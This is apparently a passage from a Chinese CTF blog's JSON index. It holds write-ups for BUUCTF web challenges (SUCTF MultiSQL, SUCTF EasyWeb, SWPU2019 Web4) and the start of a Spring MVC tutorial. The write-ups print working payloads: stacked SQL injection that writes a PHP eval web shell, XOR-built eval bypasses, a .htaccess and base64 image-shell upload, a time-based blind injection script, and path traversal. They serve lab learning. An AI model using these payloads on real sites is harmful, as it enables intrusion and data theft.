urlencode($MY);\n\n\n\n实际上是有函数名的，而且%00lambda_1中最后面的数字是会变的，我们只需要数字对了，我们就可以直接调用函数\n这么一看那个eval不知道在干什么，我还是感觉这样也可以\n我们也是直接上爆破数字\n\n\n当代码错误的时候状态码为500，我们只需要找到200的请求就行了\n\n\n没想到会这么快\n"},{"title":"[SUCTF_2018]MultiSQL","url":"/2025/04/30/SUCTF-2018-MultiSQL/","content":"[SUCTF_2018]MultiSQL这个题目可以说是最近遇到的相对容易的题目了，果然比起折磨自己，我还是更喜欢摆烂\n首先什么都没有，但是我们在页面源代码中发现了user/login.php和user/reg.php访问一下分别是登录和注册界面，我们直接注册并登录。\n\n\n当我们点击编辑头像可以上传文件，但是我们上传的文件全部都会变成.jpg图片，原来这就是文件上传的最终防御吗\n我们点击用户信息会显示我们的名字，如果是其他题目我会怀疑一下SSTI，但是这个是php后端，名字上面也写了sql。\n\n\n我们点击用户信息后发现通过GET传递了id这个参数，试了一下这里存在越权，我们将id改为1就可以查看到admin的用户信息\n没想到注入点会直接通过GET传递，好一个梦回sqli-labs\n看了题解后这是一个过滤的堆叠注入，配合文件写入(flag不在数据库中)，堆叠注入需要我们用到预处理语句，之前随便注那个题目也用到了，但是没有仔细去学，现在可以去学下MySQL预处理\nMySQL预处理\nMySQL预处理主要分为变量预处理和执行语句预处理\n预处理语句\nprepare 语句名称 from 预处理的sql语句 \nprepare sql_1 from &quot;select * from pdo&quot;;\n\n\n\nexecute 执行预处理语句\nexecute sql_1;\n\n\n\ndrop prepare删除预处理变量\ndrop prepare sql_1;\n\n\n\n预处理变量\n**set @**变量名 &#x3D; 值;  –这里的@是在MySQL中定义变量的一种语法形式（类比php中的$符号）\nset @id=2;\n\n\n\n带变量执行预处理语句\n由于需要用到变量，我们的预处理语句需要提前使用占位符，一个?代表一个参数\nprepare sql_2 from &quot;select * from pdo where id = ?&quot;;\n\n\n\nexecute 语句名称 using 参数变量;\nexecute sql_2 using @id;   --选出id=2的信息#后面的变量数量需要和预处理语句保持一致\n\n我们平时在已经可以使用堆叠注入的时候，还要想办法的去使用预处理语句肯定是有原因的，当我们的关键词被过滤了且可以堆叠注入的情况，我们一般使用编码绕过，但是无论使用ascii还是十六进制解码后的语句都是作为字符串处理，我们没办法直接执行命令，这时候我们就需要配合预处理变量和预处理语句\n#如果直接执行变量MariaDB [(none)]&gt; set @a=&#x27;select version()&#x27;;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; select @a;+------------------+| @a               |+------------------+| select version() |+------------------+#会视为字符串#但是当我们prepare from的是变量的时候MariaDB [(none)]&gt; prepare t from @a;Query OK, 0 rows affected (0.00 sec)Statement preparedMariaDB [(none)]&gt; execute t;+-------------------+| version()         |+-------------------+| 10.1.29-MariaDB-6 |+-------------------+1 row in set (0.00 sec)#会将字符串转化为预处理语句#最后的利用方法就是先将我们0x...和chr()等编码作为变量，然后通过prepare去将set的变量作为命令，最后通过excute去执行\n\n明明随便注的时候考到了这里，但是当时真的是无知者无畏根本不知道为什么这么写，记住了答案罢了(搞不好现在这题也是如此)\n我们在了解完MySQL预处理语句后可以通过一句话木马和into outfile进行写马到php文件中\nselect &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;\n\n直接这样写肯定是不行的，这题把select过滤了，我们需要编码\n网上的wp都是用的char()进行ascii编码，我想试下十六进制，我自己尝试是可以用的\n\n\n理论成了，开始实践\n?id=2;set @a=0x73656c65637420273c3f706870206576616c28245f504f53545b315d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e706870273b;prepare t from @a;execute t;\n\n事实证明这样的写法是可行的但是不知道为什么，我们无法直接在/var/www/html我们只能/var/www/html/favicon/shell.php放在favicon路径下\n最后再贴一个ascii码的apyload吧\n?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;\n\n这里我们需要注意一下char()这个函数，他不是专门用来转ascii的，只不过默认是ascii，实际上可以配置且功能十分强大\nCHAR() 是 MySQL 中的一个字符串函数，用于根据给定的数值代码返回对应的字符。\nCHAR(N1, N2, N3, ..., Nn [USING charset_name])\n\n\nN1, N2, ...：一个或多个整数，代表字符的数值代码\nUSING charset_name：可选参数，指定使用的字符集\n\nCHAR() 函数将每个整数参数解释为字符代码，并返回由这些字符组成的字符串。数值范围应在 0-255 之间。\nSELECT CHAR(65);  -- 返回 &#x27;A&#x27; (ASCII 65对应大写字母A)SELECT CHAR(72, 69, 76, 76, 79);  -- 返回 &#x27;HELLO&#x27;SELECT CHAR(128 USING utf8mb4);  -- 返回 utf8mb4 字符集中代码为128的字符SELECT CHAR(256);  -- 返回 NULL 并产生警告\n\n\n如果参数为 NULL，则会被忽略\n如果参数超出 0-255 范围，结果将为 NULL\n默认使用服务器的默认字符集\nCHAR() 与 CHAR 数据类型是不同的概念\n\n"},{"title":"[SUCTF_2019]EasyWeb","url":"/2025/04/18/SUCTF-2019-EasyWeb/","content":"[SUCTF 2019]EasyWeb这个题目考的是异或构造命令执行\n&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) )    die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;\n\n我们的目的就是通过三层绕过然后进行最后的命令执行，我们直接看正则表达式\nif ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) )    die(&#x27;Try something else!&#x27;);\n\n直接把我们的数字和字母给过滤掉了，我们只有一种方法，异或拼接命令执行\n之前没试过这个方法，我们先贴一个异或拼接的脚本\n&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\\n&quot;;                    echo &#x27;%&#x27; . dechex($a[$i]) . &#x27;^%&#x27; . dechex($a[$j]).&quot;\\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;\n\n我们运行后拿到这些数据\nG%86^%c1E%86^%c3T%86^%d2_%86^%d9\n\n我们使用这个可以构造payload\n?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo//&#123;&#125;用来划定变量名的边界  本来%86可以是其他种类的不可见字符的，但是限定了只能有12种字符//这样写的目的就是让%86作为$_GET的键$_GET[&#x27;%86&#x27;]=phpinfo\n\n我们可以通过这个方法去调用get_the_flag()函数，这个函数对我们拓展名进行检查，不能存在ph，对内容进行检查，不能出现&lt;?\nif(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); //这个代码检测的是文件头，我们需要使用GIF89a进行绕过\n\n\n\n这些都可以绕过，但是我们自己上传文件，这个我还是第一次遇见，我看了题解后发现这个可以通过php代码实现\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--题目链接--&gt;&lt;form action=&quot;http://8d22cfbb-0ec0-42f4-b27f-de6d04423133.node4.buuoj.cn:81/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\n效果就是这样，没想到之前的题目代码这么简单\n能够上传文件后，我们就直接构造图片马就行了\n我们通过phpinfo和抓包都可以看到对面服务器使用的是apache，我们可以配合图片马上传j.htaccess\n我们先调用函数\nhttp://48ce013e-ae30-4e9d-89ca-dd1fdd7f962e.node5.buuoj.cn:81/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag\n\n至于exif_imagetype对问价内容检测可以通过添加文件头幻术来绕过，.htaccess中#作为注释，所以可以采用XBM文件的，而上传的PHP代码文件可以添加更为方便的GIF文件的。\n//.htaccess#define width 1337#define height 1337php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./poc.jpg&quot;AddType application/x-httpd-php .jpg\n\n//我们接着上传图片马GIF89a66PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==\n\n我们上传完以后直接，用蚁剑连接即可，题解后面还有，但是我直接在根目录下面找到flag了\n他们说是题目有disable_function的限制，我就拿张绕过截图吧\n\n"},{"title":"[SWPU2019]Web4","url":"/2025/05/11/SWPU2019-Web4/","content":"[SWPU2019]Web4这个题目首先是一个登录框，点击注册功能发现未开放，我们尝试登录\n抓包发现，username和passwd以json数据的形式传输，怀疑sql注入，尝试万能密码发现无回显，且只存在语法错误和账号密码错误两种结果，并且存在过滤，发现当出现被过滤的关键词的时候，即使语法错误也会显示密码错误\n由于无回显，我们只能使用盲注，布尔盲注需要对不同的布尔值有不同的回显(很明显，这里不分账号和密码，只会回显账号或密码错误)，于是我们需要使用时间盲注\n\n\n我们在试万能密码的时候就发现有很多关键词都被过滤掉了，导致万能密码无效，进过尝试select sleep等必须的关键词都被过滤了，这时候只能去尝试能否使用堆叠注入，通过预处理语句和16进制去绕过关键词过滤\n\n\n我们在后面添加了单引号和分号，如果不支持堆叠注入会导致语法错误，这里判断出存在堆叠注入\n\n\n\n\n我们现在需要使用预处理语句和16进制构造注入语句，思路就是，先将我们的注入语句转化为16进制，然后通过set命令写入变量，再通过prepare命令将变量写入预处理命令，最后使用execute进行代码执行\nset @a=0x....;prepare buu from @a;execute buu; #\n\n这个方法还可以用来绕过引号被过滤的情况，如果不使用预处理变量，就会导致16进制被作为字符串\n这里贴一个大佬的脚本\n#author: c1e4rimport requestsimport jsonimport timedef main():    #题目地址    url = &#x27;http://4b36dbda-a085-4538-88b8-a9aa2215c816.node5.buuoj.cn:81/index.php?r=Login/Index&#x27;    #注入payload    payloads = &quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;    flag = &#x27;&#x27;    for i in range(1,30):        #查询payload        payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;        for j in range(0,128):            #将构造好的payload进行16进制转码和json转码            datas = &#123;&#x27;username&#x27;:payloads.format(str_to_hex(payload.format(i,j))),&#x27;password&#x27;:&#x27;test213&#x27;&#125;            data = json.dumps(datas)            times = time.time()            res = requests.post(url = url, data = data)            if time.time() - times &gt;= 3:                flag = flag + chr(j)                print(flag)                breakdef str_to_hex(s):    return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])if __name__ == &#x27;__main__&#x27;:    main()\n\n我看了一下只能说这个脚本没错，但是需要跑的时间比较长，为什么不使用二分法而是直接暴力(话说写脚本为什么会知道后面有非字母和数字的字符啊)\n还有个需要注意的是不能直接将if语句写入变量，需要select，if语句的返回值才能被执行\n最后还是没有直接跑出flag，而是一个zip文件glzjin_wants_a_girl_friend.zip，我们下载下来发现好多文件，我们只看有用的\n//index.php&lt;?php // 定义项目路径define(&#x27;BASE_PATH&#x27;, __DIR__);define(&#x27;BASR_URL&#x27;, &quot;&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;/demo/Blog&quot;);// 引入核心类require BASE_PATH . &#x27;/Common/config.php&#x27;;require BASE_PATH . &#x27;/Common/fun.php&#x27;;require BASE_PATH . &#x27;/Common/Tools.php&#x27;;\n\nconfig.php一看就是数据库连接文件，我们直接把另外两个文件找到\n///Common/fun.php// 路由控制跳转至控制器if(!empty($_REQUEST[&#x27;r&#x27;]))&#123;\t$r = explode(&#x27;/&#x27;, $_REQUEST[&#x27;r&#x27;]);\tlist($controller,$action) = $r;\t$controller = &quot;&#123;$controller&#125;Controller&quot;;\t$action = &quot;action&#123;$action&#125;&quot;;    //会根据我传入的参数对其进拼接，比如传r=Login/Index    //LoginControler   actionIndex  和下面默认的一样\tif(class_exists($controller))\t&#123;\t\tif(method_exists($controller,$action))\t\t&#123;\t\t\t//\t\t&#125;\t\telse\t\t&#123;\t\t\t$action = &quot;actionIndex&quot;;\t\t&#125;\t&#125;\telse\t&#123;\t\t$controller = &quot;LoginController&quot;;        $action = &quot;actionIndex&quot;;\t&#125;    $data = call_user_func(array( (new $controller), $action));    //    //如果我们传入的数据经过拼接后不存在就直接跳转登录界面&#125; else &#123;    header(&quot;Location:index.php?r=Login/Index&quot;);&#125;\n\n\n\n我们需要看这段代码\n$data = call_user_func(array( (new $controller), $action));\n\n原来的用法为action为函数的参数，但是外面套了一个array()\n\nnew $controller - 动态实例化一个类\n$controller 是一个字符串变量，包含类名\n这会创建该类的实例对象\n\n\narray( (new $controller), $action ) - 创建一个可调用数组\n第一个元素是新创建的对象实例\n第二个元素 $action 是一个字符串变量，包含方法名\n这种数组格式在 PHP 中表示对象方法调用\n\n\ncall_user_func() - 调用回调函数\n接受上面创建的数组作为参数\n效果等同于 $object-&gt;method()\n\n\n\n//相当于$object = new $controller;$data = $object-&gt;$action();\n\n我们这个时候就需要找到可以使用的类了，但是没发现什么直接包含的文件，但是进过一番寻找，在Controller文件夹下面发现了三个类\n看完之后发现只有一个类可以利用其进行文件读取\n//BaseController.php&lt;?php /*** 所有控制器的父类*/class BaseController&#123;\t/*\t * 加载视图文件\t * viewName 视图名称\t * viewData 视图分配数据\t*/\tprivate $viewPath;\tpublic function loadView($viewName =&#x27;&#x27;, $viewData = [])\t&#123;\t\t$this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;\t\tif(file_exists($this-&gt;viewPath))\t\t&#123;\t\t\textract($viewData);\t\t\tinclude $this-&gt;viewPath;\t\t&#125;\t&#125;\t&#125;\n\n\n\n//UserController.php&lt;?php /*** 用户控制器*/class UserController extends BaseController&#123;\t// 访问列表\tpublic function actionList()\t&#123;\t\t$params = $_REQUEST;\t\t$userModel = new UserModel();\t\t$listData = $userModel-&gt;getPageList($params);\t\t$this-&gt;loadView(&#x27;userList&#x27;, $listData );\t&#125;    public function actionIndex()    &#123;        $listData = $_REQUEST;        $this-&gt;loadView(&#x27;userIndex&#x27;,$listData);    &#125;&#125;\n\n这里BASE_PATH是网站根目录，然后在文件存在的情况下会对这个文件进行包含\n然后我在第二个类中对上一个类进行了继承，我们发现有两个方法我们可以进行调用，都可以触发loadView进行文件包含，由于我们无法决定loadView的第一个参数，我们无法利用目录跨越漏洞，只能去看这两个文件了(但是userlist.php好像不存在，于是只有一个文件需要看了)\n//userIndex.php&lt;?phpfunction imgToBase64($img_file) &#123;    $img_base64 = &#x27;&#x27;;    if (file_exists($img_file)) &#123;        $app_img_file = $img_file; // 图片路径        $img_info = getimagesize($app_img_file); // 取得图片的大小，类型等        $fp = fopen($app_img_file, &quot;r&quot;); // 图片是否可读权限        if ($fp) &#123;            $filesize = filesize($app_img_file);            $content = fread($fp, $filesize);            $file_content = chunk_split(base64_encode($content)); // base64编码            switch ($img_info[2]) &#123;           //判读图片类型                case 1: $img_type = &quot;gif&quot;;                    break;                case 2: $img_type = &quot;jpg&quot;;                    break;                case 3: $img_type = &quot;png&quot;;                    break;            &#125;            $img_base64 = &#x27;data:image/&#x27; . $img_type . &#x27;;base64,&#x27; . $file_content;//合成图片的base64编码        &#125;        fclose($fp);    &#125;    return $img_base64; //返回图片的base64&#125;?&gt;\n\n只有一个函数，我们也只能调用它，函数就是对我们提供的文件路径img_file进行一个读取，然后base64编码输出，然后并没对路径进行一个过滤，也没过滤文件后缀和路径，导致我们直接目录穿越，读取flag.php即可\npayload\nindex.php?r=User/Index&amp;img_file=/../flag.php\n\n这个题目不是特别难，主要是时间盲注和php文件太多了，有点乱\n"},{"title":"Secret","url":"/2025/04/17/Secret/","content":""},{"title":"Spring_MVC","url":"/2025/07/29/Spring-MVC/","content":"Spring_MVC前言java开始学了，但是java_sec_code这个靶场似乎使用到了Spring框架，虽然CTF不需要特别了解这些，但是到后面不仅要审框架还有些其他用到了Spring框架的代码，所以稍微学一点。\n我们之前已经了解了Spring，但是还不知道Spring的Web代码，而Spring MVC则是Spring中主流的Web框架，然后就是Spring boot中集成了Spring MVC，使用起来自动化高还方便，还有就是现在IDEA中已经不支持传统的Spring MVC了，因为Spring boot可以完全替代Spring MVC于是我使用的就是Spring boot\n1.MVC设计模式MVC（Model-View-Controller）是一种常见的软件设计模式，用于将应用程序的逻辑分离成三个独立的组件：\n\n模型（Model）：模型是应用程序的数据和业务逻辑的表示。它负责处理数据的读取、存储和操作，以及业务规则的处理。模型通常是独立于用户界面的，可以在不同的视图和控制器之间共享和重用。\n视图（View）：视图是用户界面的呈现部分，负责展示数据给用户，并接收用户的输入。视图通常是根据模型的数据进行渲染和更新的，它可以是Web页面、图形界面或命令行界面等。\n控制器（Controller）：控制器是模型和视图之间的协调者，负责接收用户的输入并根据输入调用相应的模型逻辑。控制器将用户的请求转发给模型进行处理，并将处理结果传递给视图进行展示。控制器还可以处理视图的事件和状态变化。\n\n\n\n\n层\n作用\n典型在 Spring MVC 中的组件\n\n\n\nModel（模型层）\n封装业务数据和业务逻辑，负责和数据库交互\nEntity &#x2F; POJO &#x2F; Service &#x2F; Repository\n\n\nView（视图层）\n展示数据给用户，负责界面渲染\nJSP &#x2F; Thymeleaf &#x2F; HTML &#x2F; JSON 输出\n\n\nController（控制层）\n接收用户请求，调用 Model 获取数据，然后选择 View 来展示\n@Controller &#x2F; @RestController\n\n\n这三者在Web中的流程如下\n浏览器请求 → Controller → 调用 Model → Model 返回数据 → Controller 选择 View → View 渲染页面 → 浏览器显示\n\n也就是Controller是接收到请求的地方，然后作为View(类似前端)和Model之间交互的工具，用于决定渲染的页面和返回的数据\nMVC 的比喻\n\nModel（模型） &#x3D; 厨师：负责准备食材（数据）\nController（控制器） &#x3D; 服务员：接收订单、告诉厨师做什么、把菜端给顾客\nView（视图） &#x3D; 顾客餐桌上的摆盘：负责把菜漂亮地呈现出来\n\n\n通过这种分工，每个人只管自己的事，互不干扰，维护方便。\n\n原始的Java Web的所有逻辑全都由Servlet完成，每一个URL对应一个Servlet，代码耦合严重，如果是大项目的话修改的工作量很大。MVC的控制器和模型就解决了这个问题，业务逻辑不需要和路由挂钩的Controller负责，我们只需要修改Model即可\n然后Java Web使用的还是JSP，这个是html和Java代码的结合，也就是说我们从Servlet获取的数据需要经过JSP逻辑再处理才能返回到html界面中，于是如果我们想要修改返回类型不仅需要改Servlet还需要改JSP的逻辑代码才能改变返回数据，这个工作量也是十分大的。但是MVC的View中不需要处理业务逻辑，只需要根据返回的数据然后渲染不同的前端即可，Spring boot中自带ViewResolver用于处理数据，代码如下\n@Controllerpublic class UserController &#123;    @GetMapping(&quot;/user&quot;)    public String user(Model model) &#123;        model.addAttribute(&quot;name&quot;, &quot;Alice&quot;);        return &quot;userDetail&quot;; // 逻辑视图名，ViewResolver 找到模板渲染    &#125;&#125;\n\n\n\n\n\nMVC设计模式的作用如下：\n\n分离关注点：MVC将应用程序的不同关注点（数据、业务逻辑、用户界面）分离开来，使得各个组件可以独立开发、测试和维护，提高了代码的可读性和可维护性。\n\n提高可重用性：通过将数据和业务逻辑抽象成模型，可以在不同的视图和控制器之间共享和重用，减少了重复编写代码的工作量。\n\n改善可扩展性：MVC模式使得各个组件之间的耦合度降低，可以更方便地对应用程序进行扩展和修改，而不会影响其他组件的功能。\n\n改善用户体验：通过将用户界面和业务逻辑分离，MVC模式使得用户界面更加灵活和响应，可以根据不同的需求进行定制和优化。\n\n\n总的来说，MVC设计模式通过将应用程序的逻辑分离成模型、视图和控制器，提供了一种结构化的开发方式，使得代码更加可读、可维护和可扩展，同时改善了用户体验和开发效率。\n2.Spring MVCSpring MVC是一个Java框架，用于构建Web应用程序。它遵循Model-View-Controller设计模式。它实现了核心Spring框架的所有基本功能，例如控制反转，依赖注入。\nSpring MVC与MVC的关系\n\nSpring MVC是一个Web框架，而MVC是一种架构模式。Spring MVC是基于MVC模式的实现之一。\nMVC是一种将应用程序的不同方面分离的设计模式，包括模型（Model）、视图（View）和控制器（Controller）。\nSpring MVC遵循MVC设计模式，将应用程序的不同方面分离开来，通过模型、视图和控制器的协作来处理Web请求。\n\n综上所述，Spring MVC是Spring框架提供的基于MVC架构并继承了Servlet API的Web开发框架。它遵循MVC模式的原则，提供了一套完整的开发流程和特性。通过Spring框架的支持，它能够实现灵活性、可配置性和可扩展性，帮助开发者构建高性能的Web应用程序。\n注意：既然是 Web框架，那么当用户在浏览器中输入了url之后，我们的Spring MVC 项目就可以感知到用户的请求。\n学习Spring MVC，我们只需要掌握以下3个功能：\n1.连接的功能︰将用户（浏览器）和 Java 程序连接起来，也就是访问一个地址能够调用到我们的Spring程序。\n2.获取参数的功能︰用户访问的时候会带一些参数，在程序中要想办法获取到参数。\n3.输出数据的功能︰执行了业务逻辑之后，要把程序执行的结果返回给用户。\n3.MVC连接在Spring MVC项目中实现连接操作之前，我们需要先解决一个问题：何为路由映射？\n所谓的路由映射指的是，当用户访问一个url时，将用户的请求对应到程序中某个类的某个方法的过程。\nSpring MVC项目实现连接的操作就与路由映射密切相关，实现路由映射可以使用注解。\n用来实现注册接口的路由映射的常见注解有@RequestMapping，@PostMapping，@GetMapping。\n实在没想到，在我们世界上最好的语言PHP中，一开始竟然是没有路由这个概念的，ThinkPHP中也是通过一个php文件将我们访问的URL截下来然后进行路由解析。\n@RequestMapping注解\n@RequestMapping(value = &quot;/users&quot;, method = RequestMethod.GET)public String getUsers() &#123; ... &#125;\n\n@RequestMapping注解的基本用法说明：\n\n@RequestMapping注解可以修饰类，也可以修饰方法，当修饰类和方法时，访问的地址是类＋方法。\n@RequestMapping注解可以处理任何HTTP方法的请求，包括GET、POST、PUT、DELETE等。\n@RequestMapping注解可以使用method属性来进行限定处理请求的HTTP方法。\n\n\n\n\n属性\n说明\n示例\n\n\n\nvalue &#x2F; path\n指定 URL 路径\n@RequestMapping(&quot;/users&quot;)\n\n\nmethod\n指定 HTTP 方法（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）\nmethod = RequestMethod.GET\n\n\nparams\n要求请求必须包含某些参数\nparams = &quot;id=123&quot;\n\n\nheaders\n要求请求必须包含某些头信息\nheaders = &quot;Content-Type=application/json&quot;\n\n\nconsumes\n限制请求的 Content-Type\nconsumes = &quot;application/json&quot;\n\n\nproduces\n限制响应的 Content-Type\nproduces = &quot;application/json&quot;\n\n\nSpring提供了更简洁的其他注解来替代@RequestMapping(method &#x3D; …)，是HTTP专用\n\n\n\n注解\n等效写法\n用途\n\n\n\n@GetMapping\n@RequestMapping(method = RequestMethod.GET)\n处理 GET 请求\n\n\n@PostMapping\n@RequestMapping(method = RequestMethod.POST)\n处理 POST 请求\n\n\n@PutMapping\n@RequestMapping(method = RequestMethod.PUT)\n处理 PUT 请求\n\n\n@DeleteMapping\n@RequestMapping(method = RequestMethod.DELETE)\n处理 DELETE 请求\n\n\n@PatchMapping\n@RequestMapping(method = RequestMethod.PATCH)\n处理 PATCH 请求\n\n\n4.MVC参数获取我们可以通过代码直接传递各种参数，但是也需要通过HTTP请求头中获取参数，我们就需要使用到参数获取的注解\nSpring MVC 提供了多种灵活的方式从 HTTP 请求中获取参数，包括 URL 路径变量、查询参数、表单数据、JSON 请求体、请求头、Cookie 等。\n1.@PathVariable(URL路径变量)\n@GetMapping(&quot;/users/&#123;id&#125;&quot;)public String getUser(@PathVariable Long id) &#123;    return &quot;User ID: &quot; + id;&#125;\n\n访问方式：\n\nURL：/users/100\n输出：User ID: 100\n\n上面这种情况要求必须有id路径参数，我们也可以选择可有可无\n@GetMapping(&quot;/users/&#123;id&#125;&quot;)public String getUser(@PathVariable(required = false) Long id) &#123;    return id != null ? &quot;User ID: &quot; + id : &quot;No ID provided&quot;;&#125;\n\n\n\n2.@RequestParam(获取查询参数)\n@GetMapping(&quot;/search&quot;)public String search(    @RequestParam String keyword,               // 必须参数    @RequestParam(defaultValue = &quot;1&quot;) int page  // 可选参数，默认值 1) &#123;    return &quot;Search: &quot; + keyword + &quot;, Page: &quot; + page;&#125;\n\n访问方式：\n\nURL：/search?keyword=spring&amp;page=2\n输出：Search: spring, Page: 2\n\n获取所有查询参数（Map 或 MultiValueMap）：\n@GetMapping(&quot;/params&quot;)public String getAllParams(@RequestParam Map&lt;String, String&gt; params) &#123;    return &quot;Params: &quot; + params.toString();&#125;\n\n当参数类型为 Map&lt;String, String&gt; 时，Spring 会将所有查询参数自动解析为一个键值对集合。\n3.@ModelAttribute(获取表单数据)\n@PostMapping(&quot;/register&quot;)public String register(@ModelAttribute User user) &#123;    return &quot;Registered: &quot; + user.getName();&#125;\n\n表单数据：\n&lt;form action=&quot;/register&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;    &lt;input type=&quot;email&quot; name=&quot;email&quot; /&gt;    &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;&lt;/form&gt;\n\n后台对象：\npublic class User &#123;    private String name;    private String email;    // Getter/Setter&#125;\n\n这就是用来获取对象吧\n4.@RequestBody(获取JSON数据)\n@PostMapping(&quot;/users&quot;)public User createUser(@RequestBody User user) &#123;    return userService.save(user);&#125;\n\n用于REST API 接收 JSON 数据（application/json）。\n请求示例：\ncurl -X POST -H &quot;Content-Type: application/json&quot; \\-d &#x27;&#123;&quot;name&quot;:&quot;John&quot;,&quot;email&quot;:&quot;john@example.com&quot;&#125;&#x27; \\http://localhost:8080/users\n\njson数据解析后储存到对象中\n5.@RequestHeader(获取请求头)\n@GetMapping(&quot;/headers&quot;)public String getHeader(    @RequestHeader(&quot;User-Agent&quot;) String userAgent,    @RequestHeader(value = &quot;Authorization&quot;, required = false) String auth//用于从HTTP请求头中获取指定的字段值) &#123;    return &quot;User-Agent: &quot; + userAgent + &quot;, Auth: &quot; + auth;&#125;\n\n\n\n6.文件上传\n文件上传的获取实际上也是获取表单内容，但是我们需要@RequestParam+ MultipartFile注解配合使用\n@PostMapping(&quot;/upload&quot;)public String uploadFile(    @RequestParam(&quot;file&quot;) MultipartFile file) &#123;    String fileName = file.getOriginalFilename();    return &quot;Uploaded: &quot; + fileName;&#125;\n\n\n\n5.数据输出在写java_sec_code靶场的时候，发现一个奇怪的地方\n@GetMapping(&quot;/any&quot;)    public String index() &#123;        return &quot;upload&quot;; // return upload.html page    &#125;\n\n这个代码明明是/any的路由，而且返回的一看就是字符串，但是却返回upload.html。这个简直从来没见过，这个就是以前在flask中接触到的视图渲染。\n1.视图渲染\n视图渲染是 Spring MVC 将模型数据与模板结合生成最终响应内容（如 HTML、PDF 等）的过程。\n如果要从视图渲染的原理讲起实在太难了，所以我只要求看得懂代码\n我们先得区分文本数据和模板渲染\n通过注解区分\n@RestController 标记的类所有方法默认返回数据（相当于每个方法自动加 @ResponseBody）：\n@RestController // 所有方法返回数据public class ApiController &#123;    @GetMapping(&quot;/data&quot;)    public User getUser() &#123;        return new User(&quot;John&quot;); // 